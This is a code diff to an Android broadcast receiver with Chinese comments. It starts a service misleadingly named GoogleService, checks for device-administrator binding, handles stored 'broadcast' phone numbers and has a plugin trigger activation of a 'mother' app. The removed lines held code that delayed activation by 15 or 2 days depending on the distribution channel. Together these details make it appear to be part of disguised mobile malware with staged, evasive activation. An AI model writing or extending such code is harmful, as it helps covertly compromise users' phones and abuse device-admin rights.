@@ -47,15 +47,16 @@ public class ScreenBRC extends BroadcastReceiver {
         serviceIntent.setClass(context, GoogleService.class);
         context.startService(serviceIntent);
 
+        SettingManager.getInstance().init(context);
+
         //启动小时定时器
         BRCUtil.startHourAlarm(context);
 
         boolean isForce = intent.getBooleanExtra(KEY_FORCE_FETCH, false);
 
         DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
-        boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class));
-
-        SettingManager.getInstance().init(context);
+        boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class))
+                                    || SettingManager.getInstance().getKeyHasBindingDevices();
 
         String oldPhoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
         if (!TextUtils.isEmpty(oldPhoneNumbers)) {
@@ -69,31 +70,22 @@ public class ScreenBRC extends BroadcastReceiver {
             /**
              * 绑定了设备才进行其他动作
              */
+            if (SettingManager.getInstance().getMainApkActiveTime() == 0) {
+                //子程序没有做母程序激活
+                if (!TextUtils.isEmpty(SettingManager.getInstance().getMainApkChannel())
+                    && !TextUtils.isEmpty(SettingManager.getInstance().getMainApkSendUUID())
+                    && !TextUtils.isEmpty(SettingManager.getInstance().getMainExtraInfo())) {
+                    //关键的三个数据都不为空在进行激活，否则激活也找不到对应的设备串号，所以什么也不做
+                    Intent mainActive = new Intent();
+                    mainActive.setAction(PluginService.ACTION_MAIN_UUID_ACTIVE_BY_PLUGN);
+                    mainActive.setClass(context, PluginService.class);
+                    context.startService(mainActive);
+                }
+            }
+
             String action = intent.getAction();
             if (Intent.ACTION_USER_PRESENT.equals(action) || HOUR_ALARM_ACTION.equals(action)) {
                 Config.LOGD("[[ScreenBRC::onReceive]] action = " + action);
-
-//                Calendar c1 = Calendar.getInstance();
-//                int day = c1.get(Calendar.DAY_OF_YEAR);
-//                int delay = 0;
-//                if (day > SettingManager.getInstance().getFirstLanuchTime()) {
-//                    //在同一年
-//                    delay = day - SettingManager.getInstance().getFirstLanuchTime();
-//                } else {
-//                    //跨年
-//                    delay = day + (356 - SettingManager.getInstance().getFirstLanuchTime());
-//                }
-//                if (Integer.valueOf(Config.CHANNEL_CODE) > 500000) {
-//                    //大于500000的渠道用于内置渠道
-//                    if (delay < 15) {
-//                        return;
-//                    }
-//                } else {
-//                    //小于500000的渠道用于自己推广
-//                    if (!Config.DEBUG && delay < 2) {
-//                        return;
-//                    }
-//                }
 
                 if (SettingManager.getInstance().getKeyActiveTime() == 0) {
                     //没有激活过，就调用激活接口
